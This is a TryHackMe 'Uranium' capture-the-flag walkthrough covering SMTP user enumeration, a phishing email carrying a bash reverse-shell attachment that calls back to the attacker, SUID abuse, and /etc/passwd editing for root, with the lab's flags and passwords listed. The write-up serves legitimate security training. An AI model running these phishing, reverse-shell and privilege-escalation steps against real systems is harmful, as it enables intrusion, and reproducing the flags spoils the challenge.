# TryHackMe: Uranium CTF — Walkthrough

**Platform:** TryHackMe
**Difficulty:** Hard
**Theme:** Phishing (cronjobs and services)
**Flags:** chat app password, hakanbey's password, `user_1.txt`, `user_2.txt`, `web_flag.txt`, `root.txt`.

This one is a phishing box, and the interesting part isn't any single exploit — it's the way each step only makes sense once the previous one has told you where to look. I went down a couple of wrong turns getting there, and I've left them in, because the wrong turns are where the reasoning actually happens.

---

## Recon — and why I ignored the website

I started where I always do:

```bash
nmap -sV -sC -T4 -p- --min-rate 1000 $IP
```

Three ports: 22 (SSH), 25 (Postfix SMTP), 80 (Apache). My first instinct was the web server — it's usually the fattest attack surface — so I went there first. But the site turned out to be the stock HTML5 UP "Dimension" template, and gobuster only turned up `assets/`, `images/`, and the license files. I fuzzed for vhosts too, in case the "chat app" the room mentions was hiding on a subdomain:

```bash
ffuf -w .../subdomains-top1million-5000.txt -u http://$IP/ -H "Host: FUZZ.uranium.thm" -fs 10351
```

Nothing. And *that* is what redirected me. When the web server is a dead end but there's a **Postfix server sitting wide open on port 25**, the box is telling you the entry point is email, not HTTP. The room's whole theme is phishing, and here was the delivery mechanism. So I stopped fighting the website and turned to SMTP.

Before crafting anything, I confirmed who I could actually mail. Postfix had `VRFY` enabled, which happily tells you whether a local user exists:

```bash
for u in hakanbey root www-data kral4 admin; do echo "VRFY $u" | nc -w 3 $IP 25; done
```

`hakanbey`, `root`, `www-data`, and `kral4` all came back `252` (exists); the rest were rejected. So `hakanbey` and `kral4` were my two human targets. Good — the room brief already named hakanbey and linked his Twitter, and his tweets said he'd **run any email attachment named `application` in his terminal**. That's the hook. Something on the box (a cronjob, per the room's own hint) plays the part of hakanbey opening the file.

---

## Foothold — phishing hakanbey (user_1.txt)

If he'll run a file called `application`, I'll give him one that calls back to me. The filename is the important part — that's what his tweet specified, so that's presumably what the cron looks for:

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<TUN_IP>/1234 0>&1\n' > application
nc -nlvp 1234        # listener in another tab
```

Then I mailed it to him:

```bash
swaks --to hakanbey@uranium.thm --from admin@uranium.thm \
  --server $IP --header "Subject: Application Request" \
  --body "Please run the attached application" \
  --attach @application --suppress-data
```

A minute or two later the listener caught a shell. I upgraded it to a real PTY (the first thing I always do, so tab-completion and job control work), confirmed who I was, and looked for the first flag:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
id                                  # uid=1000(hakanbey)
cat /home/hakanbey/user_1.txt       # FLAG: user_1.txt
ls -la /home/hakanbey/
```

The home directory had a binary called `chat_with_kral4` — which immediately looked like the next thread to pull, given the "chat app password" flag I still needed.

---

## The chat app — pcap forensics for the password

Running `chat_with_kral4` just asked for a `PASSWORD:` and got me nowhere. So the question became: where would a password for a chat app be lying around? I searched the filesystem for anything that smelled like captured traffic, on the theory that a chat handshake might have been logged:

```bash
find / -iname "*.pcap" 2>/dev/null
# /var/log/hakanbey_network_log.pcap
```

There it was. I pulled it back to my box to read it properly:

```bash
# on target:  cd /var/log && python3 -m http.server 8000
# on kali:     wget http://$IP:8000/hakanbey_network_log.pcap
strings hakanbey_network_log.pcap
```

The capture was a recorded chat between hakanbey and kral4, and the very first string — before any of the "Hi bro" small talk — was clearly the handshake password:

```
MBMD1vdpjg3kGv6SsIz56VNG      <- chat app password (FLAG)
```

Reading the rest of the conversation was useful for a different reason. In the capture, hakanbey starts to ask kral4 for his forgotten password, but then says *"no need anymore"* and cancels. So the pcap hands me the **chat password** but deliberately withholds hakanbey's own password. To get that, I'd have to have the conversation myself.

---

## Talking to kral4 — and the detour that taught me how the bot works

With the chat password, the client let me in:

```bash
cd /home/hakanbey && ./chat_with_kral4
# PASSWORD: MBMD1vdpjg3kGv6SsIz56VNG
kral4:hi hakanbey
```

Here's where I wasted a good ten minutes. I assumed the bot was keyword-driven, so I tried to ask for the password directly — *"I forgot my password, can you send it?"*, *"what is my password"*, and half a dozen variations. Every single one came back with a flat `?`. I even tried mirroring the exact phrasing from the pcap. Still `?`.

The `?` was the clue I kept ignoring: it wasn't matching my *content* at all. When I stopped trying to steer the conversation and just made ordinary small talk — one short word at a time — the bot drove itself:

```
->hi
kral4:how are you?
->good
kral4:what now? did you forgot your password again
->yes
kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
```

So the bot is a scripted flow, not a keyword matcher. It leads; you answer plainly, and when *it* raises the forgotten-password question, you say `yes`. That's the whole trick, and I'd been overcomplicating it. **`Mys3cr3tp4sw0rD`** — hakanbey's password (FLAG).

(The chat service is flaky and dropped with a BrokenPipe a couple of times mid-conversation; re-running `./chat_with_kral4` just respawns it.)

Now I could ditch the reverse shell for a stable SSH session:

```bash
ssh hakanbey@$IP        # Mys3cr3tp4sw0rD
```

---

## Pivoting to kral4 (user_2.txt)

First thing after any credentialed login — check sudo rights:

```bash
sudo -l
# User hakanbey may run the following commands on uranium:
#     (kral4) /bin/bash
```

hakanbey can run bash *as kral4*. Not root, but a sideways step to another user is exactly the kind of thing that unlocks the next set of files:

```bash
sudo -u kral4 /bin/bash
id                              # uid=1001(kral4)
cat /home/kral4/user_2.txt      # FLAG: user_2.txt
```

---

## web_flag.txt — reading the owner, not just the SUID bit

Now I wanted root, so I went hunting for the usual escalation vectors. The SUID scan turned up one thing that didn't belong:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -la /bin/dd
# -rwsr-x--- 1 web kral4 76000 /bin/dd
```

My reflex was "SUID `dd`, that's root file-write, game over." But I checked the owner before celebrating — and it's owned by **`web`**, not root. That reframes the whole thing: running it as kral4 executes `dd` as the `web` user, which is a *lateral* move, not a vertical one. So the question wasn't "what can I do as root," it was "what does `web` own that I can't currently reach?"

The answer was `web_flag.txt`, sitting in `/var/www/html/` as `-rw------- web web` — unreadable to kral4, but `web` owns it, and I could act as `web` through `dd`:

```bash
dd if=/var/www/html/web_flag.txt 2>/dev/null    # FLAG: web_flag.txt
```

That solved the web flag, but it also left me with a more useful capability than I'd first appreciated: `dd`-as-`web` can *write* any file `web` owns — and `web` owns the entire web root, `index.html` included. I filed that away.

---

## Root — figuring out the service before feeding it anything

`dd`-as-web couldn't read `/root/root.txt` (web isn't root), so `web` was a dead end for vertical escalation on its own. I needed to know what else was running. `ps aux` as root-owned processes turned up the piece that mattered:

```bash
ps aux | grep root
# root  848  /usr/bin/python3 /root/htmlcheck.py
```

A custom root service, `htmlcheck.py`. The name plus the web root ownership plus a small file in kral4's home called `.check` (which held `False` and kept getting a fresh timestamp) all pointed the same way: something running as root was watching the website. And kral4's mail spelled out the deal:

```bash
cat /var/mail/kral4
# "I give SUID to the nano file in your home folder to fix the attack on our
#  index.html. Keep the nano there, in case it happens again."
```

So the intended logic: if `index.html` gets "attacked," root grants kral4 a SUID `nano` to repair it. I had the write primitive to trigger that (SUID `dd` as `web`, and `web` owns `index.html`).

But I didn't want to fire blindly, so I **probed the behavior first**. I flipped `.check` to `True` by hand — nothing happened. I then modified `index.html` with a junk value and watched: still no visible reaction in the directory. That told me my mental model was wrong somewhere, and rather than keep guessing at a root-owned script I couldn't read, I reasoned it through: the mail says the trigger is *changing index.html* and the *precondition* is a matching `nano` in the home folder. I hadn't placed a nano yet. So I did it properly:

```bash
cp /bin/nano /home/kral4/nano                        # genuine nano - this matters (see below)
echo "hacked" | dd of=/var/www/html/index.html 2>/dev/null
```

Within a minute, root reacted — a new email landed and the nano changed:

```bash
cat /var/mail/kral4
# "I think our index page has been hacked again. You know how to fix it,
#  I am giving authorization."
ls -la /home/kral4/nano
# -rwsrwxrwx 1 root root 245872 /home/kral4/nano      <- SUID root
```

### SUID nano to root

nano is a full-screen editor and needs a real terminal, so over the reverse/SSH shell it kept opening blank and then wedging my terminal on exit. Wrapping it in `script` gave it a proper PTY:

```bash
/usr/bin/script -qc "/home/kral4/nano /etc/passwd" /dev/null
```

Inside nano I changed kral4's UID/GID to 0:

```
kral4:x:1001:1001:...   ->   kral4:x:0:0:...:/home/kral4:/bin/bash
```

Saved, exited (the terminal locked up cosmetically again — a `reset` or a fresh login clears it; the save persists). Then anything resolving to "kral4" is UID 0. Reconnecting and re-entering the kral4 shell dropped me straight to root:

```bash
ssh hakanbey@$IP
sudo -u kral4 /bin/bash
id                          # uid=0(root)
cat /root/root.txt          # FLAG: root.txt
```

### The trap I'm glad I didn't spring

As root I finally read the script I'd been reasoning about blind, and it contained a boobytrap that punishes the obvious shortcut:

```python
if hashlib.md5(open(nano_path,'rb').read()).hexdigest() != nano_hash:
    os.system("wall 'That is not nano, sending the cops, bye!'")   # x5
    time.sleep(5)
    os.system('shutdown now')          # <- kills the box
else:
    ...
    os.system("sendEmail ... I am giving authorization ...")
    os.system("chown root:root /home/kral4/nano && chmod 4777 /home/kral4/nano")
```

It md5-compares the nano in kral4's home against the real `/bin/nano`. Had I taken the tempting shortcut — dropping a *fake* "nano" that was really a shell script, to get instant code execution — the hash wouldn't match and the script would have `wall`-spammed and then `shutdown now` the whole machine. Because I copied the genuine `/bin/nano`, the hash matched and root granted the SUID instead. That `cp /bin/nano` was load-bearing, and it's a neat argument for understanding a mechanism before you feed it input.

---

## Flags

| # | Flag |
|---|---|
| Chat app password | `MBMD1vdpjg3kGv6SsIz56VNG` |
| hakanbey password | `Mys3cr3tp4sw0rD` |
| user_1.txt | `thm{2aa50e58fa82244213d5438187c0da7c}` |
| user_2.txt | `thm{804d12e6d16189075db2d45449aeda5f}` |
| web_flag.txt | `thm{019d332a6a223a98b955c160b3e6750a}` |
| root.txt | `thm{81498047439cc0426bafa1db5da699cd}` |

## What the box taught me

- **A dead end is a direction.** The empty website wasn't a failure to enumerate harder — it was the box pointing me at the open SMTP port. Reading absence as a signal saved a lot of wasted gobuster time.
- **Listen to the error.** The chat bot's flat `?` was telling me my whole approach (keyword injection) was wrong; once I treated it as "off-script" rather than "wrong keyword," the plain-small-talk solution was obvious.
- **Check the owner, not just the bit.** SUID `dd` looked like instant root and was actually a lateral step to `web`. The permission string had the answer; my reflex didn't.
- **Understand the service before you trigger it.** I probed `htmlcheck.py`'s behavior from outside and reasoned out its precondition — and reading it afterward showed a `shutdown` trap that would have bitten anyone who took the fake-nano shortcut.

**Rooted.**
